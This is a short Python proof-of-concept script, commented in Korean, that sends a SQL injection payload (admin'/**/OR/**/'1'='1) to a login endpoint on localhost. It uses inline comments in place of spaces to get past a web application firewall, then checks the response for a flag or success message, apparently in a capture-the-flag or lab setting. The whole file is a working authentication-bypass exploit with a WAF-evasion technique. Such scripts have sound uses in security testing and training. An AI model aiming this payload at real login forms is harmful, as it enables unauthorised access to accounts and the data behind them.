# WAF 우회 SQLi - poc.py
import requests

TARGET = "http://localhost:3000"
ENDPOINT = "/login"
FULL_URL = TARGET + ENDPOINT

# 우회 시도 payload (WAF 우회 기법 사용)
payload = {
    "username": "admin'/**/OR/**/'1'='1",
    "password": "pw"
}

def run_poc():
    print(f"[+] Sending payload to {FULL_URL}")
    res = requests.post(FULL_URL, data=payload)

    if "FLAG" in res.text or "Success" in res.text:
        print("[+] PoC 성공: WAF 우회 SQL Injection 존재!")
        print(res.text)
    else:
        print("[-] PoC 실패: 차단됨 또는 우회 실패")

if __name__ == "__main__":
    run_poc()